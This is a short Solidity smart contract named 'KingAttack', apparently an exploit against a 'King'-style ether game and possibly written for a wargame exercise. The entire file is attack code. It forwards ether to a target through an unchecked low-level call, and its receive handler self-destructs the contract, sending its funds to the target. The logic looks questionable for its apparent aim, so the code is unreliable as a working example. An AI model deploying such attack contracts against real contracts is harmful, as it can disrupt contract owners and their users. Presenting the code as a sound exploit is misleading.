// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address payable public king;
    constructor(address payable _king) payable {
        king = _king;
    }

    receive() external payable {
        selfdestruct(king);
    }

    function attack() public payable {
        king.call{value: msg.value}("");
    }
}